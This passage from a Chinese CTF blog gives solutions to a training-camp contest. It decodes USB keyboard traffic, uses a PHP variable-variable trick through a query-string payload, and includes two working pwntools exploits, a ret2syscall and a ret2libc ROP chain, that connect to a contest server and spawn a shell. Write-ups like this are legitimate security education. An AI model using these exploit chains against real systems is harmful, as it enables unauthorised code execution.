class="line"></span><br><span class="line"><span class="comment"># remove KR padding</span></span><br><span class="line"></span><br><span class="line">d = d.replace(<span class="string">b&#x27;$)C&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(b64decode(d))</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/">结营赛Wp</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-09-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="结营赛wp">
          <a href="#结营赛wp" class="heading-link"><i class="fas fa-link"></i></a><a href="#结营赛wp" class="headerlink" title="结营赛wp"></a>结营赛wp</h1>
      <p>最终排名第10，还可以吧</p>
<p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/AAwangzhan\1\hexoblog\source\image\image-20230818231358283.png"></p>
<p>##misc</p>

        <h3 id="签到">
          <a href="#签到" class="heading-link"><i class="fas fa-link"></i></a><a href="#签到" class="headerlink" title="签到"></a>签到</h3>
      <p>hsnctf{welcome_to_hsnctf}</p>

        <h3 id="easyusb">
          <a href="#easyusb" class="heading-link"><i class="fas fa-link"></i></a><a href="#easyusb" class="headerlink" title="easyusb"></a>easyusb</h3>
      <p>打开压缩包发现，一个流量包和一个flag.zip加密</p>
<p>应该是通过流量包得到密码解得flag</p>
<p>流量包是键盘流量</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">─$ tshark -T json -r usb.pcapng &gt; test.json </span><br></pre></td></tr></table></div></figure>

<p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/AAwangzhan\1\hexoblog\source\image\QQ图片20230818231436.png"></p>
<p>手动提取键盘流量</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">16</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">06</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1f</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">08</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">17</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>e:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">20</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">1</span>c:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span></span><br></pre></td></tr></table></div></figure>

<p>之后利用脚本</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mappings = &#123; <span class="number">0x04</span>:<span class="string">&quot;A&quot;</span>,  <span class="number">0x05</span>:<span class="string">&quot;B&quot;</span>,  <span class="number">0x06</span>:<span class="string">&quot;C&quot;</span>, <span class="number">0x07</span>:<span class="string">&quot;D&quot;</span>, <span class="number">0x08</span>:<span class="string">&quot;E&quot;</span>, <span class="number">0x09</span>:<span class="string">&quot;F&quot;</span>, <span class="number">0x0A</span>:<span class="string">&quot;G&quot;</span>,  <span class="number">0x0B</span>:<span class="string">&quot;H&quot;</span>, <span class="number">0x0C</span>:<span class="string">&quot;I&quot;</span>,  <span class="number">0x0D</span>:<span class="string">&quot;J&quot;</span>, <span class="number">0x0E</span>:<span class="string">&quot;K&quot;</span>, <span class="number">0x0F</span>:<span class="string">&quot;L&quot;</span>, <span class="number">0x10</span>:<span class="string">&quot;M&quot;</span>, <span class="number">0x11</span>:<span class="string">&quot;N&quot;</span>,<span class="number">0x12</span>:<span class="string">&quot;O&quot;</span>,  <span class="number">0x13</span>:<span class="string">&quot;P&quot;</span>, <span class="number">0x14</span>:<span class="string">&quot;Q&quot;</span>, <span class="number">0x15</span>:<span class="string">&quot;R&quot;</span>, <span class="number">0x16</span>:<span class="string">&quot;S&quot;</span>, <span class="number">0x17</span>:<span class="string">&quot;T&quot;</span>, <span class="number">0x18</span>:<span class="string">&quot;U&quot;</span>,<span class="number">0x19</span>:<span class="string">&quot;V&quot;</span>, <span class="number">0x1A</span>:<span class="string">&quot;W&quot;</span>, <span class="number">0x1B</span>:<span class="string">&quot;X&quot;</span>, <span class="number">0x1C</span>:<span class="string">&quot;Y&quot;</span>, <span class="number">0x1D</span>:<span class="string">&quot;Z&quot;</span>, <span class="number">0x1E</span>:<span class="string">&quot;1&quot;</span>, <span class="number">0x1F</span>:<span class="string">&quot;2&quot;</span>, <span class="number">0x20</span>:<span class="string">&quot;3&quot;</span>, <span class="number">0x21</span>:<span class="string">&quot;4&quot;</span>, <span class="number">0x22</span>:<span class="string">&quot;5&quot;</span>,  <span class="number">0x23</span>:<span class="string">&quot;6&quot;</span>, <span class="number">0x24</span>:<span class="string">&quot;7&quot;</span>, <span class="number">0x25</span>:<span class="string">&quot;8&quot;</span>, <span class="number">0x26</span>:<span class="string">&quot;9&quot;</span>, <span class="number">0x27</span>:<span class="string">&quot;0&quot;</span>, <span class="number">0x28</span>:<span class="string">&quot;\n&quot;</span>, <span class="number">0x2a</span>:<span class="string">&quot;[DEL]&quot;</span>,  <span class="number">0X2B</span>:<span class="string">&quot;    &quot;</span>, <span class="number">0x2C</span>:<span class="string">&quot; &quot;</span>,  <span class="number">0x2D</span>:<span class="string">&quot;-&quot;</span>, <span class="number">0x2E</span>:<span class="string">&quot;=&quot;</span>, <span class="number">0x2F</span>:<span class="string">&quot;[&quot;</span>,  <span class="number">0x30</span>:<span class="string">&quot;]&quot;</span>,  <span class="number">0x31</span>:<span class="string">&quot;\\&quot;</span>, <span class="number">0x32</span>:<span class="string">&quot;~&quot;</span>, <span class="number">0x33</span>:<span class="string">&quot;;&quot;</span>,  <span class="number">0x34</span>:<span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x36</span>:<span class="string">&quot;,&quot;</span>,  <span class="number">0x37</span>:<span class="string">&quot;.&quot;</span> &#125;</span><br><span class="line">nums = []</span><br><span class="line">keys = <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>))</span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>得到密码为SEC2ETK3Y（大写），解开压缩包得到flag</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hsnctf&#123;y0u_can_g4t_easy_usb&#125;</span><br></pre></td></tr></table></div></figure>

<p>##pwn</p>

        <h3 id="ret2syscall">
          <a href="#ret2syscall" class="heading-link"><i class="fas fa-link"></i></a><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">from LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"># from ctypes <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49003</span>)</span><br><span class="line"></span><br><span class="line"># r = gdb.debug(<span class="string">&#x27;./bheap&#x27;</span>)</span><br><span class="line"># r = process(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"># libc = cdll.LoadLibrary(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"># libc = ELF(<span class="string">&#x27;/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line"># ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span></span><br><span class="line"># srand = libc.srand(libc.time(<span class="number">0</span>)) #设置种子</span><br><span class="line"></span><br><span class="line">se      = lambda data               :r.send(data)</span><br><span class="line">sa      = lambda delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = lambda data               :r.sendline(data)</span><br><span class="line">sla     = lambda delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = lambda delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = lambda numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = lambda                    :r.recvline()</span><br><span class="line">ru      = lambda delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = lambda data               :u32(data.ljust(<span class="number">4</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = lambda data               :u64(data.ljust(<span class="number">8</span>, b<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">lic 	= lambda data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">pack    = lambda str, addr          :p32(addr)</span><br><span class="line">padding = lambda lenth              :b<span class="string">&#x27;aaaaa&#x27;</span>*(lenth<span class="comment">//5)+b&#x27;F&#x27;*(lenth % 5)</span></span><br><span class="line">it      = lambda                    :r.interactive()</span><br><span class="line"></span><br><span class="line">rax = <span class="number">0x0000000000400721</span> #: pop rax ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rdx</span> <span class="operator">=</span> <span class="number">0x0000000000400721</span> #: pop rdx ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rsi</span> <span class="operator">=</span> <span class="number">0x000000000400735</span> #: pop rsi ; <span class="type">ret</span></span><br><span class="line"><span class="variable">rdx</span> <span class="operator">=</span> <span class="number">0x000000000400735</span>	#:  pop rdx ; <span class="type">ret</span></span><br><span class="line"><span class="variable">ret</span> <span class="operator">=</span> <span class="number">0x0000000000400509</span> #: <span class="type">ret</span></span><br><span class="line"><span class="variable">binsh</span> <span class="operator">=</span> <span class="number">0x0000000000601048</span> #: /bin/<span class="type">sh</span></span><br><span class="line"><span class="variable">syscall</span> <span class="operator">=</span> <span class="number">0x000000000400741</span></span><br><span class="line">rdi = <span class="number">0x000000000040072b</span> #: pop rdi ; <span class="type">ret</span></span><br><span class="line"></span><br><span class="line"><span class="variable">pl</span> <span class="operator">=</span> b<span class="string">&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(rax) + p64(<span class="number">0x3b</span>) + p64(rsi) + p64(<span class="number">0</span>) + p64(rdx) + p64(<span class="number">0</span>) + p64(rdi) + p64(binsh) + p64(syscall)</span><br><span class="line">sl(pl)</span><br><span class="line"></span><br><span class="line">it()</span><br></pre></td></tr></table></div></figure>

<p>hsnctf{85ef9d72-c603-17df-59bc}</p>

        <h3 id="ret2libc">
          <a href="#ret2libc" class="heading-link"><i class="fas fa-link"></i></a><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from ctypes import *</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;58.240.236.231&#x27;</span>,<span class="number">49002</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = gdb.debug(&#x27;./bheap&#x27;)</span></span><br><span class="line"><span class="comment"># r = process(&#x27;1&#x27;)</span></span><br><span class="line"><span class="comment"># libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/h711/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"><span class="comment"># ld-linux-x86-64.so.2</span></span><br><span class="line"><span class="comment"># srand = libc.srand(libc.time(0)) #设置种子</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">lic 	= <span class="keyword">lambda</span> data               :uu64(ru(data)[-<span class="number">6</span>:])</span><br><span class="line">pack    = <span class="keyword">lambda</span> <span class="built_in">str</span>, addr          :p32(addr)</span><br><span class="line">padding = <span class="keyword">lambda</span> lenth              :<span class="string">b&#x27;aaaaa&#x27;</span>*(lenth//<span class="number">5</span>)+<span class="string">b&#x27;F&#x27;</span>*(lenth % <span class="number">5</span>)</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :r.interactive()</span><br><span class="line"></span><br><span class="line">main = elf.sym[<span class="string">&#x27;vul&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x0000000000400783</span></span><br><span class="line">ret = <span class="number">0x0000000000400509</span></span><br><span class="line">rc()</span><br><span class="line">pl = <span class="number">0xD8</span>*<span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(rdi) + p64(puts_got) + p64(puts_plt)  + p64(main)</span><br><span class="line">sl(pl)</span><br><span class="line"><span class="comment"># print(rc())</span></span><br><span class="line">put_addr = lic(<span class="string">&#x27;\x7f&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;put====&gt;&#x27;</span>,<span class="built_in">hex</span>(put_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,put_addr)</span><br><span class="line">base = put_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xD8</span> + p64(ret) + p64(rdi) + p64(binsh) + p64(system)</span><br><span class="line">sl(pl2)</span><br><span class="line"></span><br><span class="line">it()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sl()</span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>hsnctf{04b4cfca-db86-486b-14b2}</p>

        <h2 id="web">
          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a><a href="#web" class="headerlink" title="web"></a>web</h2>
      <p>###git</p>
<p><span class="exturl"><a class="exturl__link" target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62879498/article/details/124586653%E5%80%9F%E9%89%B4%E5%8E%9F%E9%A2%98">https://blog.csdn.net/m0_62879498/article/details/124586653借鉴原题</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>Git扫描后发现git泄露</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">print_r($flag);</span><br><span class="line"></span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;  // $键 = $值的值</span><br><span class="line">    $$x = $y;  </span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;// $handsome = flag的值  ---&gt;   $handsome = $flag  --&gt; $x=handsome &amp; $y=flag</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> // 需要不满足以下几个条件</span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;  //不能同时 flag的值等于某个键名，那个键值又是flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;// 不能同时  GET 和 POST 都没设置 flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;// 任意都不能满足 flag === &#x27;flag&#x27;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></div></figure>

<p>利用条件：</p>
<p>if($_GET[‘flag’] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; ‘flag’){ &#x2F;&#x2F;不能同时  flag的值等于某个键名，那个键名又是flag, 就是 flag&#x3D;a &amp;&amp; a!&#x3D;flag啊，这样就能进了  ?flag&#x3D;(不是flag)&amp;(不是flag)&#x3D;xxx<br> 进入条件十分简单：?flag&#x3D;a&amp;a&#x3D;flag 即可<br>函数判断到 a&#x3D;flag 的时候， $_GET[‘flag’] &#x3D;&#x3D;&#x3D; $x &amp;&amp; $x !&#x3D;&#x3D; ‘flag’ –&gt; a &#x3D;&#x3D;&#x3D; a &amp;&amp; a !&#x3D;&#x3D; ‘flag’ 这就进来了 true &amp;&amp; true 就进来了， 然后 exit($handsome);<br>因为要 <code>exit($handsome);</code> 那么我们要做的就是 让<code>$handsome = $flag get</code> 条件的处理如下：</p>
<p>​    foreach($_GET as $x &#x3D;&gt; $y){<br>​        $$x &#x3D; $$y;&#x2F;&#x2F; $handsome &#x3D; flag的值  —&gt;   $handsome &#x3D; $flag  –&gt; $x&#x3D;handsome &amp; $y&#x3D;flag<br>​    }</p>
<p><code>$$x = $$y</code>而我们要的结果是<code>$handsome = $flag</code>那么特简单 让 <code>​x=handsome 和 $y=flag</code>即可</p>
<blockquote>
<p>playload:?handsome&#x3D;flag&amp;flag&#x3D;b&amp;b&#x3D;flag</p>
</blockquote>
<p><img src="/2023/09/01/%E7%BB%93%E8%90%A5%E8%B5%9Bwp/AAwangzhan\1\hexoblog\source\image\image-20230818225755467.png"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/31/%5B%E5%A4%A9%E7%BF%BC%E6%9D%AF%202021%5Desay_eval%20/">Esay_eval</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-31</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-09-18</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>#[天翼杯 2021]esay_eval </p>
<p>exp</p>
